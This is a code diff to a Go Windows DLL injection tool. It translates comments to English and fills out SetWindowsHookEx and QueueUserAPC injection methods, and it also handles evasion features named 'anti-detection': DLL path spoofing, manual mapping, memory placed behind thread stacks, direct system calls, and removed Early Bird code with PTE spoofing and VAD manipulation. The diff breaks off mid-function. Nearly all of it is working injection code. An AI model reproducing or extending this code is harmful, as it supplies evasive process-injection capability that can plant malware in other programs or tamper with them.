@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"os"
 	"strconv"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -73,7 +74,7 @@ type Injector struct {
 	logger        Logger // Logger for all operations
 }
 
-// Windows API 函数调用
+// Windows API function calls
 var (
 	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
 
@@ -83,7 +84,7 @@ var (
 	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
 )
 
-// VirtualAllocEx 在远程进程中分配内存
+// VirtualAllocEx allocates memory in remote process
 func VirtualAllocEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
 	r1, _, e1 := procVirtualAllocEx.Call(
 		uintptr(process),
@@ -97,7 +98,7 @@ func VirtualAllocEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, f
 	return r1, nil
 }
 
-// VirtualFreeEx 释放远程进程的内存
+// VirtualFreeEx frees memory in remote process
 func VirtualFreeEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, dwFreeType uint32) error {
 	r1, _, e1 := procVirtualFreeEx.Call(
 		uintptr(process),
@@ -110,7 +111,7 @@ func VirtualFreeEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, dw
 	return nil
 }
 
-// WriteProcessMemory 写入远程进程内存
+// WriteProcessMemory writes to remote process memory
 func WriteProcessMemory(process windows.Handle, baseAddress uintptr, buffer unsafe.Pointer, size uintptr, bytesWritten *uintptr) error {
 	r1, _, e1 := procWriteProcessMemory.Call(
 		uintptr(process),
@@ -124,7 +125,7 @@ func WriteProcessMemory(process windows.Handle, baseAddress uintptr, buffer unsa
 	return nil
 }
 
-// CreateRemoteThread 在远程进程中创建线程
+// CreateRemoteThread creates a thread in remote process
 func CreateRemoteThread(process windows.Handle, threadAttributes *windows.SecurityAttributes, stackSize uint32, startAddress uintptr, parameter uintptr, creationFlags uint32, threadID *uint32) (windows.Handle, error) {
 	r1, _, e1 := procCreateRemoteThread.Call(
 		uintptr(process),
@@ -140,7 +141,7 @@ func CreateRemoteThread(process windows.Handle, threadAttributes *windows.Securi
 	return windows.Handle(r1), nil
 }
 
-// NewInjector 创建一个新的Injector实例
+// NewInjector creates a new Injector instance
 func NewInjector(dllPath string, processID uint32, logger Logger) *Injector {
 	return &Injector{
 		dllPath:   dllPath,
@@ -164,19 +165,19 @@ func NewInjector(dllPath string, processID uint32, logger Logger) *Injector {
 	}
 }
 
-// SetMethod 设置注入方法
+// SetMethod sets the injection method
 func (i *Injector) SetMethod(method InjectionMethod) {
 	i.method = method
 }
 
-// SetBypassOptions 设置反检测选项
+// SetBypassOptions sets anti-detection options
 func (i *Injector) SetBypassOptions(options BypassOptions) {
 	i.bypassOptions = options
 }
 
-// Inject 执行DLL注入
+// Inject performs DLL injection
 func (i *Injector) Inject() error {
-	// 检查基本参数
+	// Check basic parameters
 	if i.dllPath == "" {
 		err := errors.New("DLL path not set")
 		i.logger.Error("Injection failed", "error", err)
@@ -194,13 +195,13 @@ func (i *Injector) Inject() error {
 		"process_id", i.processID,
 		"method", i.method)
 
-	// 如果使用手动映射，则必须从内存加载
+	// If using manual mapping, must load from memory
 	if i.bypassOptions.ManualMapping {
 		i.logger.Info("Manual mapping enabled, automatically enabling memory load option")
 		i.bypassOptions.MemoryLoad = true
 	}
 
-	// 使用合法进程注入
+	// Use legitimate process injection
 	if i.bypassOptions.LegitProcessInjection {
 		i.logger.Info("Using legitimate process injection method")
 		return i.legitProcessInject()
@@ -249,7 +250,7 @@ func (i *Injector) checkDllPath() error {
 		return err
 	}
 
-	// 检查文件是否存在
+	// Check if file exists
 	_, err := os.Stat(i.dllPath)
 	if err != nil {
 		if os.IsNotExist(err) {
@@ -275,7 +276,7 @@ func (i *Injector) checkProcessID() error {
 		return err
 	}
 
-	// 尝试打开进程检查是否存在
+	// Try to open process to check if it exists
 	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, i.processID)
 	if err != nil {
 		errMsg := "Failed to open process (PID: " + strconv.FormatUint(uint64(i.processID), 10) + "): " + err.Error()
@@ -288,9 +289,9 @@ func (i *Injector) checkProcessID() error {
 	return nil
 }
 
-// standardInject 标准的DLL注入方法
+// standardInject standard DLL injection method
 func (i *Injector) standardInject() error {
-	// 检查参数是否有效
+	// Check if parameters are valid
 	if err := i.checkDllPath(); err != nil {
 		return err
 	}
@@ -340,7 +341,7 @@ func (i *Injector) standardInject() error {
 	return i.diskLoadDLL()
 }
 
-// advancedDiskLoadDLL 使用高级技术（线程栈后分配和直接系统调用）从磁盘加载DLL
+// advancedDiskLoadDLL loads DLL from disk using advanced techniques (allocate behind thread stack and direct system calls)
 func (i *Injector) advancedDiskLoadDLL() error {
 	// 打开目标进程
 	hProcess, err := windows.OpenProcess(
@@ -461,7 +462,7 @@ func (i *Injector) advancedDiskLoadDLL() error {
 	return nil
 }
 
-// allocateBehindThreadStack 在目标进程的线程栈后分配内存
+// allocateBehindThreadStack allocates memory behind thread stack in target process
 func allocateBehindThreadStack(hProcess windows.Handle, size uintptr) (uintptr, error) {
 	// 不再需要fmt.Printf，因为调用此函数的地方会先进行日志记录
 
@@ -478,7 +479,7 @@ func allocateBehindThreadStack(hProcess windows.Handle, size uintptr) (uintptr, 
 	// 2. 创建线程快照以便枚举线程
 	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
 	if err != nil {
-		return 0, fmt.Errorf("Failed to create thread snapshot: %v", err)
+		return 0, errors.New("Failed to create thread snapshot: " + err.Error())
 	}
 	defer windows.CloseHandle(hSnapshot)
 
@@ -487,7 +488,7 @@ func allocateBehindThreadStack(hProcess windows.Handle, size uintptr) (uintptr, 
 	te.Size = uint32(unsafe.Sizeof(te))
 	err = windows.Thread32First(hSnapshot, &te)
 	if err != nil {
-		return 0, fmt.Errorf("Failed to get first thread: %v", err)
+		return 0, errors.New("Failed to get first thread: " + err.Error())
 	}
 
 	var threadId uint32
@@ -500,16 +501,16 @@ func allocateBehindThreadStack(hProcess windows.Handle, size uintptr) (uintptr, 
 		err = windows.Thread32Next(hSnapshot, &te)
 		if err != nil {
 			if err == windows.ERROR_NO_MORE_FILES {
-				return 0, fmt.Errorf("No threads found for target process")
+				return 0, errors.New("No threads found for target process")
 			}
-			return 0, fmt.Errorf("Failed to enumerate threads: %v", err)
+			return 0, errors.New("Failed to enumerate threads: " + err.Error())
 		}
 	}
 
 	// 4. 打开找到的线程
 	hThread, err := windows.OpenThread(windows.THREAD_QUERY_INFORMATION, false, threadId)
 	if err != nil {
-		return 0, fmt.Errorf("Failed to open thread: %v", err)
+		return 0, errors.New("Failed to open thread: " + err.Error())
 	}
 	defer windows.CloseHandle(hThread)
 
@@ -571,7 +572,7 @@ func allocateBehindThreadStack(hProcess windows.Handle, size uintptr) (uintptr, 
 	return allocAddr, nil
 }
 
-// ntCreateThreadEx 使用直接系统调用创建远程线程
+// ntCreateThreadEx creates remote thread using direct system calls
 func ntCreateThreadEx(hProcess windows.Handle, startAddr uintptr, parameter uintptr) (windows.Handle, error) {
 	// 移除 fmt.Printf，在调用者函数中记录日志
 
@@ -586,7 +587,7 @@ func ntCreateThreadEx(hProcess windows.Handle, startAddr uintptr, parameter uint
 	// 预留空间给返回的句柄
 	var threadHandle windows.Handle
 
-	r1, _, err := ntCreateThreadEx.Call(
+	r1, _, _ := ntCreateThreadEx.Call(
 		uintptr(unsafe.Pointer(&threadHandle)),
 		THREAD_ALL_ACCESS,
 		0, // 对象属性指针，设为NULL
@@ -601,14 +602,14 @@ func ntCreateThreadEx(hProcess windows.Handle, startAddr uintptr, parameter uint
 	)
 
 	if r1 != 0 {
-		errMsg := "Failed to create thread: 0x" + strconv.FormatUint(uint64(r1), 16) + ", " + err.Error()
+		errMsg := "Failed to create thread: NTSTATUS 0x" + strconv.FormatUint(uint64(r1), 16)
 		return 0, errors.New(errMsg)
 	}
 
 	return threadHandle, nil
 }
 
-// getThreadId 获取线程ID
+// getThreadId gets thread ID
 func getThreadId(hThread windows.Handle) uint32 {
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	getThreadId := kernel32.NewProc("GetThreadId")
@@ -617,7 +618,7 @@ func getThreadId(hThread windows.Handle) uint32 {
 	return uint32(id)
 }
 
-// diskLoadDLL 从磁盘加载DLL并注入
+// diskLoadDLL loads DLL from disk and injects
 func (i *Injector) diskLoadDLL() error {
 	// 打开目标进程
 	hProcess, err := windows.OpenProcess(
@@ -723,7 +724,7 @@ func (i *Injector) diskLoadDLL() error {
 	return nil
 }
 
-// memoryLoadDLL 从内存加载DLL并注入
+// memoryLoadDLL loads DLL from memory and injects
 func (i *Injector) memoryLoadDLL(dllBytes []byte) error {
 	// 创建临时DLL文件
 	tempPath := i.createTempDllFile(dllBytes)
@@ -801,7 +802,7 @@ func (i *Injector) memoryLoadDLL(dllBytes []byte) error {
 
 	// 执行DLL入口点（如果没有擦除入口点）
 	if !i.bypassOptions.EraseEntryPoint {
-		err = ExecuteDllEntry(hProcess, baseAddress, peHeader)
+		err = i.executeDllEntry(hProcess, baseAddress, peHeader)
 		if err != nil {
 			errMsg := "执行DLL入口点失败: " + err.Error()
 			newErr := errors.New(errMsg)
@@ -817,18 +818,27 @@ func (i *Injector) memoryLoadDLL(dllBytes []byte) error {
 func (i *Injector) createTempDllFile(dllBytes []byte) string {
 	tempFile, err := os.CreateTemp("", "dll_*.dll")
 	if err != nil {
+		i.logger.Warn("Failed to create temporary file, using original DLL path", "error", err)
 		return i.dllPath
 	}
 
 	// 写入DLL内容
-	_, err = tempFile.Write(dllBytes)
+	bytesWritten, err := tempFile.Write(dllBytes)
 	tempFile.Close()
 
 	if err != nil {
+		i.logger.Warn("Failed to write DLL content to temporary file", "error", err)
 		os.Remove(tempFile.Name())
 		return i.dllPath
 	}
 
+	if bytesWritten != len(dllBytes) {
+		i.logger.Warn("Incomplete write to temporary file", "expected", len(dllBytes), "written", bytesWritten)
+		os.Remove(tempFile.Name())
+		return i.dllPath
+	}
+
+	i.logger.Info("Created temporary DLL file", "path", tempFile.Name(), "size", bytesWritten)
 	return tempFile.Name()
 }
 
@@ -849,10 +859,13 @@ func (i *Injector) manualMapDLL(dllBytes []byte) error {
 
 // spoofDllPath 伪装DLL路径，返回伪装后的路径
 func (i *Injector) spoofDllPath() string {
+	i.logger.Info("Creating spoofed DLL path")
+
 	// 创建临时文件
 	tempFile, err := os.CreateTemp("", "sys_*.dll")
 	if err != nil {
 		// 如果创建临时文件失败，返回原始路径
+		i.logger.Warn("Failed to create temporary file for path spoofing, using original path", "error", err)
 		return i.dllPath
 	}
 	tempFile.Close()
@@ -860,15 +873,22 @@ func (i *Injector) spoofDllPath() string {
 	// 读取原始DLL
 	dllBytes, err := os.ReadFile(i.dllPath)
 	if err != nil {
+		i.logger.Warn("Failed to read original DLL file for spoofing", "error", err)
 		os.Remove(tempFile.Name())
 		return i.dllPath
 	}
 
 	// 写入临时文件
 	if err := os.WriteFile(tempFile.Name(), dllBytes, 0644); err != nil {
+		i.logger.Warn("Failed to write spoofed DLL file", "error", err)
 		os.Remove(tempFile.Name())
 		return i.dllPath
 	}
+
+	i.logger.Info("Successfully created spoofed DLL path",
+		"original", i.dllPath,
+		"spoofed", tempFile.Name(),
+		"size", len(dllBytes))
 
 	// 返回伪装的临时文件路径
 	return tempFile.Name()
@@ -909,8 +929,185 @@ func (i *Injector) hookInject() error {
 		return err
 	}
 
-	// 简化版本，使用标准方法
-	return i.diskLoadDLL()
+	i.logger.Info("Starting SetWindowsHookEx injection")
+
+	// 获取目标进程的主线程ID
+	threadID, err := i.getMainThreadID(i.processID)
+	if err != nil {
+		errMsg := "Failed to get main thread ID: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("Hook injection failed", "error", newErr)
+		return newErr
+	}
+
+	i.logger.Info("Found main thread", "thread_id", threadID)
+
+	// 加载user32.dll
+	user32 := windows.NewLazySystemDLL("user32.dll")
+	setWindowsHookEx := user32.NewProc("SetWindowsHookExW")
+	unhookWindowsHookEx := user32.NewProc("UnhookWindowsHookEx")
+
+	// 首先需要加载DLL到当前进程以获取钩子过程地址
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	loadLibrary := kernel32.NewProc("LoadLibraryW")
+	getProcAddress := kernel32.NewProc("GetProcAddress")
+
+	// 将DLL路径转换为UTF16
+	dllPathUTF16, err := windows.UTF16PtrFromString(i.dllPath)
+	if err != nil {
+		errMsg := "Failed to convert DLL path to UTF16: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("Hook injection failed", "error", newErr)
+		return newErr
+	}
+
+	// 加载DLL到当前进程
+	r1, _, err := loadLibrary.Call(uintptr(unsafe.Pointer(dllPathUTF16)))
+	if r1 == 0 {
+		errMsg := "Failed to load DLL into current process: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("Hook injection failed", "error", newErr)
+		return newErr
+	}
+	hModule := windows.Handle(r1)
+	defer windows.FreeLibrary(hModule)
+
+	// 获取钩子过程地址（假设DLL导出了一个名为"HookProc"的函数）
+	hookProcName, _ := windows.BytePtrFromString("HookProc")
+	r2, _, err := getProcAddress.Call(uintptr(hModule), uintptr(unsafe.Pointer(hookProcName)))
+	if r2 == 0 {
+		// 如果没有HookProc，尝试使用DllMain
+		dllMainName, _ := windows.BytePtrFromString("DllMain")
+		r2, _, err = getProcAddress.Call(uintptr(hModule), uintptr(unsafe.Pointer(dllMainName)))
+		if r2 == 0 {
+			errMsg := "Failed to find hook procedure in DLL: " + err.Error()
+			newErr := errors.New(errMsg)
+			i.logger.Error("Hook injection failed", "error", newErr)
+			return newErr
+		}
+	}
+	hookProc := uintptr(r2)
+
+	// 设置钩子
+	const WH_GETMESSAGE = 3
+	r3, _, err := setWindowsHookEx.Call(
+		WH_GETMESSAGE,
+		hookProc,
+		uintptr(hModule),
+		uintptr(threadID))
+
+	if r3 == 0 {
+		errMsg := "Failed to set Windows hook: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("Hook injection failed", "error", newErr)
+		return newErr
+	}
+	hHook := windows.Handle(r3)
+
+	i.logger.Info("Successfully set Windows hook", "hook_handle", hHook)
+
+	// 触发钩子执行（发送消息给目标线程）
+	err = i.triggerHook(threadID)
+	if err != nil {
+		i.logger.Warn("Failed to trigger hook", "error", err)
+	}
+
+	// 等待一段时间让钩子执行
+	time.Sleep(2 * time.Second) // 等待2秒
+
+	// 移除钩子
+	r4, _, err := unhookWindowsHookEx.Call(uintptr(hHook))
+	if r4 == 0 {
+		i.logger.Warn("Failed to unhook Windows hook", "error", err)
+	} else {
+		i.logger.Info("Successfully removed Windows hook")
+	}
+
+	return nil
+}
+
+// getMainThreadID 获取进程的主线程ID
+func (i *Injector) getMainThreadID(processID uint32) (uint32, error) {
+	// 创建线程快照
+	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
+	if err != nil {
+		return 0, errors.New("Failed to create thread snapshot: " + err.Error())
+	}
+	defer windows.CloseHandle(hSnapshot)
+
+	// 遍历线程
+	var te windows.ThreadEntry32
+	te.Size = uint32(unsafe.Sizeof(te))
+	err = windows.Thread32First(hSnapshot, &te)
+	if err != nil {
+		return 0, errors.New("Failed to get first thread: " + err.Error())
+	}
+
+	var mainThreadID uint32
+	var earliestCreationTime uint64 = ^uint64(0) // 最大值
+
+	for {
+		if te.OwnerProcessID == processID {
+			// 打开线程以获取创建时间
+			hThread, err := windows.OpenThread(windows.THREAD_QUERY_INFORMATION, false, te.ThreadID)
+			if err == nil {
+				// 获取线程创建时间
+				kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+				getThreadTimes := kernel32.NewProc("GetThreadTimes")
+
+				var creationTime, exitTime, kernelTime, userTime windows.Filetime
+				r1, _, _ := getThreadTimes.Call(
+					uintptr(hThread),
+					uintptr(unsafe.Pointer(&creationTime)),
+					uintptr(unsafe.Pointer(&exitTime)),
+					uintptr(unsafe.Pointer(&kernelTime)),
+					uintptr(unsafe.Pointer(&userTime)))
+
+				if r1 != 0 {
+					threadCreationTime := uint64(creationTime.HighDateTime)<<32 + uint64(creationTime.LowDateTime)
+					if threadCreationTime < earliestCreationTime {
+						earliestCreationTime = threadCreationTime
+						mainThreadID = te.ThreadID
+					}
+				}
+				windows.CloseHandle(hThread)
+			}
+		}
+
+		// 获取下一个线程
+		err = windows.Thread32Next(hSnapshot, &te)
+		if err != nil {
+			if err == windows.ERROR_NO_MORE_FILES {
+				break
+			}
+			return 0, errors.New("Failed to enumerate threads: " + err.Error())
+		}
+	}
+
+	if mainThreadID == 0 {
+		return 0, errors.New("No threads found for process")
+	}
+
+	return mainThreadID, nil
+}
+
+// triggerHook 触发钩子执行
+func (i *Injector) triggerHook(threadID uint32) error {
+	user32 := windows.NewLazySystemDLL("user32.dll")
+	postThreadMessage := user32.NewProc("PostThreadMessageW")
+
+	const WM_NULL = 0
+	r1, _, err := postThreadMessage.Call(
+		uintptr(threadID),
+		WM_NULL,
+		0,
+		0)
+
+	if r1 == 0 {
+		return errors.New("Failed to post thread message: " + err.Error())
+	}
+
+	return nil
 }
 
 // apcInject 使用QueueUserAPC进行注入
@@ -924,8 +1121,158 @@ func (i *Injector) apcInject() error {
 		return err
 	}
 
-	// 简化版本，使用标准方法
-	return i.diskLoadDLL()
+	i.logger.Info("Starting QueueUserAPC injection")
+
+	// 打开目标进程
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_CREATE_THREAD|
+			windows.PROCESS_VM_OPERATION|
+			windows.PROCESS_VM_WRITE|
+			windows.PROCESS_VM_READ|
+			windows.PROCESS_QUERY_INFORMATION,
+		false, i.processID)
+	if err != nil {
+		errMsg := "Failed to open target process: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("APC injection failed", "error", newErr)
+		return newErr
+	}
+	defer windows.CloseHandle(hProcess)
+
+	// 在目标进程中分配内存存储DLL路径
+	dllPathBytes := append([]byte(i.dllPath), 0) // 添加NULL终止符
+	dllPathSize := uintptr(len(dllPathBytes))
+
+	remoteDllPath, err := VirtualAllocEx(hProcess, 0, dllPathSize,
+		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		errMsg := "Failed to allocate memory in target process: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("APC injection failed", "error", newErr)
+		return newErr
+	}
+	defer VirtualFreeEx(hProcess, remoteDllPath, 0, windows.MEM_RELEASE)
+
+	// 写入DLL路径到远程进程内存
+	var bytesWritten uintptr
+	err = WriteProcessMemory(hProcess, remoteDllPath, unsafe.Pointer(&dllPathBytes[0]),
+		dllPathSize, &bytesWritten)
+	if err != nil {
+		errMsg := "Failed to write DLL path to target process memory: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("APC injection failed", "error", newErr)
+		return newErr
+	}
+
+	// 获取LoadLibraryA地址
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	loadLibraryA := kernel32.NewProc("LoadLibraryA")
+	loadLibraryAddr := loadLibraryA.Addr()
+
+	// 获取目标进程的可警告线程
+	threadID, err := i.getAlertableThread(i.processID)
+	if err != nil {
+		errMsg := "Failed to find alertable thread: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("APC injection failed", "error", newErr)
+		return newErr
+	}
+
+	i.logger.Info("Found alertable thread", "thread_id", threadID)
+
+	// 打开线程
+	hThread, err := windows.OpenThread(windows.THREAD_SET_CONTEXT, false, threadID)
+	if err != nil {
+		errMsg := "Failed to open thread: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("APC injection failed", "error", newErr)
+		return newErr
+	}
+	defer windows.CloseHandle(hThread)
+
+	// 使用QueueUserAPC
+	queueUserAPC := kernel32.NewProc("QueueUserAPC")
+	r1, _, err := queueUserAPC.Call(
+		loadLibraryAddr,
+		uintptr(hThread),
+		remoteDllPath)
+
+	if r1 == 0 {
+		errMsg := "Failed to queue APC: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("APC injection failed", "error", newErr)
+		return newErr
+	}
+
+	i.logger.Info("Successfully queued APC for DLL injection")
+
+	// 尝试唤醒线程以执行APC
+	err = i.alertThread(threadID)
+	if err != nil {
+		i.logger.Warn("Failed to alert thread", "error", err)
+	}
+
+	return nil
+}
+
+// getAlertableThread 获取可警告的线程
+func (i *Injector) getAlertableThread(processID uint32) (uint32, error) {
+	// 创建线程快照
+	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
+	if err != nil {
+		return 0, errors.New("Failed to create thread snapshot: " + err.Error())
+	}
+	defer windows.CloseHandle(hSnapshot)
+
+	// 遍历线程
+	var te windows.ThreadEntry32
+	te.Size = uint32(unsafe.Sizeof(te))
+	err = windows.Thread32First(hSnapshot, &te)
+	if err != nil {
+		return 0, errors.New("Failed to get first thread: " + err.Error())
+	}
+
+	for {
+		if te.OwnerProcessID == processID {
+			// 尝试打开线程检查是否可以设置上下文
+			hThread, err := windows.OpenThread(windows.THREAD_SET_CONTEXT, false, te.ThreadID)
+			if err == nil {
+				windows.CloseHandle(hThread)
+				return te.ThreadID, nil
+			}
+		}
+
+		// 获取下一个线程
+		err = windows.Thread32Next(hSnapshot, &te)
+		if err != nil {
+			if err == windows.ERROR_NO_MORE_FILES {
+				break
+			}
+			return 0, errors.New("Failed to enumerate threads: " + err.Error())
+		}
+	}
+
+	return 0, errors.New("No alertable thread found")
+}
+
+// alertThread 尝试唤醒线程执行APC
+func (i *Injector) alertThread(threadID uint32) error {
+	// 尝试通过发送信号来唤醒线程
+	user32 := windows.NewLazySystemDLL("user32.dll")
+	postThreadMessage := user32.NewProc("PostThreadMessageW")
+
+	const WM_NULL = 0
+	r1, _, err := postThreadMessage.Call(
+		uintptr(threadID),
+		WM_NULL,
+		0,
+		0)
+
+	if r1 == 0 {
+		return errors.New("Failed to post thread message: " + err.Error())
+	}
+
+	return nil
 }
 
 // legitProcessInject 使用合法进程注入
@@ -1054,7 +1401,7 @@ func (i *Injector) earlyBirdAPCInject() error {
 
 	// 获取当前进程可执行文件路径
 	if i.processID > 0 {
-		procPath, err = GetProcessPathByPID(i.processID)
+		procPath, err = getProcessPathByPID(i.processID)
 		if err != nil {
 			errMsg := "获取目标进程路径失败: " + err.Error()
 			newErr := errors.New(errMsg)
@@ -1093,299 +1440,183 @@ func (i *Injector) earlyBirdAPCInject() error {
 	return i.earlyBirdDiskInject(procPath, dllPath)
 }
 
-// earlyBirdMemoryInject 从内存执行早期鸟注入
-func (i *Injector) earlyBirdMemoryInject(targetPath string, dllBytes []byte) error {
-	// 定义Windows API相关常量
-	const (
-		CREATE_SUSPENDED          = 0x00000004
-		MEM_COMMIT                = 0x00001000
-		MEM_RESERVE               = 0x00002000
-		PAGE_READWRITE            = 0x04
-		PROCESS_ALL_ACCESS        = 0x001F0FFF
-		THREAD_ALL_ACCESS         = 0x001FFFFF
-		QUEUE_USER_APC_FLAGS_NONE = 0
-	)
-
-	// 1. 创建进程并挂起
-	var si windows.StartupInfo
-	var pi windows.ProcessInformation
-
-	si.Cb = uint32(unsafe.Sizeof(si))
-
-	utf16Target, _ := windows.UTF16PtrFromString(targetPath)
-	err := windows.CreateProcess(
-		nil,
-		utf16Target,
-		nil,
-		nil,
-		false,
-		CREATE_SUSPENDED,
-		nil,
-		nil,
-		&si,
-		&pi,
-	)
-	if err != nil {
-		errMsg := "创建目标进程失败: " + err.Error()
-		newErr := errors.New(errMsg)
-		i.logger.Error("Early Bird memory injection failed", "error", newErr)
-		return newErr
-	}
-
-	i.logger.Info("已创建并挂起进程", "pid", pi.ProcessId)
-	defer windows.CloseHandle(pi.Process)
-	defer windows.CloseHandle(pi.Thread)
-
-	// 2. 在目标进程中分配内存并写入DLL
-
-	if i.bypassOptions.ManualMapping {
-		// 使用手动映射
-		err := ManualMapDLL(pi.ProcessId, dllBytes, i.bypassOptions.InvisibleMemory)
-		if err != nil {
-			// 确保在失败时恢复线程并退出
-			windows.ResumeThread(pi.Thread)
-			errMsg := "手动映射DLL失败: " + err.Error()
-			newErr := errors.New(errMsg)
-			i.logger.Error("Early Bird memory injection failed", "error", newErr)
-			return newErr
-		}
-
-		// 恢复线程执行
-		i.logger.Info("Early Bird 手动映射成功，恢复线程执行")
-		windows.ResumeThread(pi.Thread)
+// executeDllEntry 执行DLL入口点
+func (i *Injector) executeDllEntry(hProcess windows.Handle, baseAddress uintptr, peHeader *PEHeader) error {
+	// 计算入口点地址
+	entryPointRVA := peHeader.OptionalHeader.AddressOfEntryPoint
+	if entryPointRVA == 0 {
+		// 没有入口点，直接返回成功
 		return nil
 	}
 
-	// 从内存加载使用反射式加载
-	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pi.ProcessId)
+	entryPointAddr := baseAddress + uintptr(entryPointRVA)
+
+	// 创建远程线程执行入口点
+	var threadID uint32
+	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, entryPointAddr, baseAddress, 0, &threadID)
 	if err != nil {
-		windows.ResumeThread(pi.Thread)
-		errMsg := "打开进程失败: " + err.Error()
-		newErr := errors.New(errMsg)
-		i.logger.Error("Early Bird memory injection failed", "error", newErr)
-		return newErr
+		return errors.New("Failed to create thread for DLL entry point: " + err.Error())
 	}
-	defer windows.CloseHandle(hProcess)
+	defer windows.CloseHandle(threadHandle)
 
-	// 获取LoadLibraryA地址
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	loadLibraryA := kernel32.NewProc("LoadLibraryA")
-
-	// 在目标进程中分配内存用于DLL路径
-	memAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(dllBytes)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-	if err != nil {
-		windows.ResumeThread(pi.Thread)
-		errMsg := "分配内存失败: " + err.Error()
-		newErr := errors.New(errMsg)
-		i.logger.Error("Early Bird memory injection failed", "error", newErr)
-		return newErr
-	}
-
-	// 写入DLL数据
-	var bytesWritten uintptr
-	err = WriteProcessMemory(hProcess, memAddr, unsafe.Pointer(&dllBytes[0]), uintptr(len(dllBytes)), &bytesWritten)
-	if err != nil {
-		windows.ResumeThread(pi.Thread)
-		errMsg := "写入DLL数据失败: " + err.Error()
-		newErr := errors.New(errMsg)
-		i.logger.Error("Early Bird memory injection failed", "error", newErr)
-		return newErr
-	}
-
-	// 创建临时文件用于加载
-	tempDllPath := i.createTempDllFile(dllBytes)
-	defer os.Remove(tempDllPath)
-
-	// 分配内存用于存储DLL路径
-	pathBytes := []byte(tempDllPath + "\x00")
-	pathAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(pathBytes)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-	if err != nil {
-		windows.ResumeThread(pi.Thread)
-		errMsg := "分配路径内存失败: " + err.Error()
-		newErr := errors.New(errMsg)
-		i.logger.Error("Early Bird memory injection failed", "error", newErr)
-		return newErr
-	}
-
-	// 写入DLL路径
-	err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&pathBytes[0]), uintptr(len(pathBytes)), &bytesWritten)
-	if err != nil {
-		windows.ResumeThread(pi.Thread)
-		errMsg := "写入路径失败: " + err.Error()
-		newErr := errors.New(errMsg)
-		i.logger.Error("Early Bird memory injection failed", "error", newErr)
-		return newErr
-	}
-
-	// 3. 使用QueueUserAPC将LoadLibraryA添加到APC队列
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	NtQueueApcThread := ntdll.NewProc("NtQueueApcThread")
-
-	// 队列APC调用LoadLibraryA
-	r1, _, err := NtQueueApcThread.Call(
-		uintptr(pi.Thread),  // 主线程句柄
-		loadLibraryA.Addr(), // LoadLibraryA地址
-		pathAddr,            // 存放DLL路径的内存地址
-		0,                   // 未使用
-		0,                   // 未使用
-	)
-
-	if r1 != 0 {
-		windows.ResumeThread(pi.Thread)
-		errMsg := "队列APC失败: " + err.Error()
-		newErr := errors.New(errMsg)
-		i.logger.Error("Early Bird memory injection failed", "error", newErr)
-		return newErr
-	}
-
-	i.logger.Info("Early Bird APC注入成功，恢复线程执行")
-
-	// 4. 应用特殊反检测技术
-	if i.bypassOptions.PTESpoofing {
-		i.pteSpoofing(hProcess, memAddr, uintptr(len(dllBytes)))
-	}
-
-	if i.bypassOptions.VADManipulation {
-		i.vadManipulation(hProcess, memAddr)
-
-		if i.bypassOptions.RemoveVADNode {
-			i.removeVADNode(hProcess, memAddr)
-		}
-	}
-
-	// 5. 恢复线程执行
-	windows.ResumeThread(pi.Thread)
+	// 等待线程执行完成
+	windows.WaitForSingleObject(threadHandle, windows.INFINITE)
 
 	return nil
 }
 
-// earlyBirdDiskInject 从磁盘执行早期鸟注入
-func (i *Injector) earlyBirdDiskInject(targetPath string, dllPath string) error {
-	// 定义Windows API相关常量
-	const (
-		CREATE_SUSPENDED   = 0x00000004
-		PROCESS_ALL_ACCESS = 0x001F0FFF
-	)
-
-	// 1. 创建进程并挂起
-	var si windows.StartupInfo
-	var pi windows.ProcessInformation
-
-	si.Cb = uint32(unsafe.Sizeof(si))
-
-	utf16Target, _ := windows.UTF16PtrFromString(targetPath)
-	err := windows.CreateProcess(
-		nil,
-		utf16Target,
-		nil,
-		nil,
-		false,
-		CREATE_SUSPENDED,
-		nil,
-		nil,
-		&si,
-		&pi,
-	)
+// getProcessPathByPID 根据PID获取进程路径（内部使用）
+func getProcessPathByPID(pid uint32) (string, error) {
+	// 打开进程
+	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pid)
 	if err != nil {
-		return fmt.Errorf("创建目标进程失败: %v", err)
